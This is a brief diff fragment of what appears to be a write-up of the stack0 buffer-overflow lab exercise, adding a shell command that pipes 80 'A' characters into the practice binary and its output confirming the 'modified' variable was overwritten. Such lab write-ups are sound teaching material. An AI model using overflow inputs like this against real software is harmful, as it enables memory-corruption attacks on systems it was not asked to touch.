@@ -96,4 +96,7 @@ Continuing.
 you have changed the 'modified' variable
 [Inferior 1 (process 2992) exited normally]
 (gdb) 
+
+root@kali:~/Desktop# (python -c 'print "A"*80';cat) | ./stack0
+you have changed the 'modified' variable
 ```
